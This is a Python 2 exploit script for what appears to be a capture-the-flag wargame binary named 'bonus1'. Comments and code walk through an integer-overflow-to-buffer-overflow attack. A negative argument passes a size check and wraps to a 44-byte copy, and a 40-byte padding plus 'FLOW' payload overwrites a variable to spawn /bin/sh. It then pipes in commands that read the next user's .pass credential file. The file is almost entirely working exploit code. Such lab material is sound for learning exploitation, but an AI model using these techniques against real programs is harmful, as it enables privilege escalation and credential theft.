#!/usr/bin/env python2
# Bonus1 exploit - Integer overflow to buffer overflow

# The exploit:
# 1. Use negative number -2147483637 to bypass n <= 9 check
# 2. Integer overflow: -2147483637 * 4 = 44 bytes (wraparound)  
# 3. Buffer overflow: 40 bytes padding + "FLOW" overwrites n variable
# 4. n becomes 0x574f4c46 ("FLOW") triggering execl("/bin/sh")

import subprocess
import sys

def exploit():
    # Negative number that passes n <= 9 check but overflows to 44
    n = "-2147483637"
    
    # Payload: 40 bytes padding + magic value "FLOW" 
    payload = "A" * 40 + "FLOW"
    
    print("[+] Bonus1 Integer Overflow Exploit")
    print("[+] n value: %s (passes n <= 9 check)" % n)
    print("[+] Copy size: %s * 4 = 44 bytes (integer overflow)" % n)
    print("[+] Payload: 40 bytes + 'FLOW' (overwrites n variable)")
    print("[+] Target: n = 0x574f4c46 â†’ execl('/bin/sh')")
    print("")
    
    # Execute exploit
    cmd = ["./bonus1", n, payload]
    print("[+] Executing: %s" % " ".join(cmd))
    
    try:
        # Start interactive shell
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Send commands to get flag
        commands = "whoami\ncat /home/user/bonus2/.pass\nexit\n"
        stdout, stderr = p.communicate(commands)
        
        print("[+] Output:")
        print(stdout)
        
        if "bonus2" in stdout:
            print("[+] SUCCESS: Shell spawned as bonus2!")
            # Extract flag from output
            lines = stdout.split('\n')
            for line in lines:
                if len(line) == 64 and line.isalnum():  # Flag format
                    print("[+] Flag: %s" % line)
        else:
            print("[-] Exploit failed")
            
    except Exception as e:
        print("[-] Error: %s" % str(e))

if __name__ == "__main__":
    exploit()